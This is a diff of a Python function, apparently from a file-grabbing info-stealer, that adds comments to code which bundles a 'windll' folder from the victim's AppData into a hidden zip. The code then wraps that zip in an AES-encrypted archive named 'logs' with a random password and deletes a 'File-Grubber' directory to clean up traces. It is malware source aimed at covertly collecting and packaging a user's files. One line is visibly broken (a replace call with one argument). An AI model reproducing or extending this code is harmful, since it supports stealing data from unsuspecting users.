@@ -21,24 +21,27 @@ def makemeZip(name,password,np):
 	try:
 		user = os.environ['USERPROFILE'].replace("C\\Users\\")
 	except:
-		dox = "qwertyuiopasdfghjklzxcvbnm1234567890"
+		dox = "qwertyuiopasdfghjklzxcvbnm1234567890"# symbols for pwd and name
 		for i in range (40):
-			name += dox[random.randint(0,len(dox)-1)]
+			name += dox[random.randint(0,len(dox)-1)]# generate name
 		name = rf"{os.environ['USERPROFILE']}\AppData\Local\{name}"
 		for i in range (60):
-			password += dox[random.randint(0,len(dox)-1)]
+			password += dox[random.randint(0,len(dox)-1)]# generate pwd
 		print(password)
 		path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
 		os.chdir(path)
-		shutil.make_archive(fr'{path}\cache', 'zip', fr'{path}\windll')
-		SetFileAttributes(r'cache.zip', FILE_ATTRIBUTE_HIDDEN)
+		shutil.make_archive(fr'{path}\cache', 'zip', fr'{path}\windll')# make .zip
+		SetFileAttributes(r'cache.zip', FILE_ATTRIBUTE_HIDDEN)# hide it
 		#shutil.move(fr'{path}\cache.zip',"cache.zip")
 		pwd = bytes(password, "UTF-8")
 		print(pwd)
-		with pyzipper.AESZipFile(f'{name}.zip','w',compression=pyzipper.ZIP_STORED,encryption=pyzipper.WZ_AES) as logs:
+		with pyzipper.AESZipFile(f'{name}.zip','w',compression=pyzipper.ZIP_STORED,encryption=pyzipper.WZ_AES) as logs:# make .zip
 			SetFileAttributes(f'{name}.zip', FILE_ATTRIBUTE_HIDDEN)
-			logs.setpassword(pwd)
-			logs.write(r'cache.zip')
+			logs.setpassword(pwd)# set pwd
+			logs.write(r'cache.zip')# write
+		"""
+		clean all
+		"""
 		os.remove("cache.zip")
 		try:
 			shutil.rmtree(rf'{path}\windll\File-Grubber', ignore_errors=True)
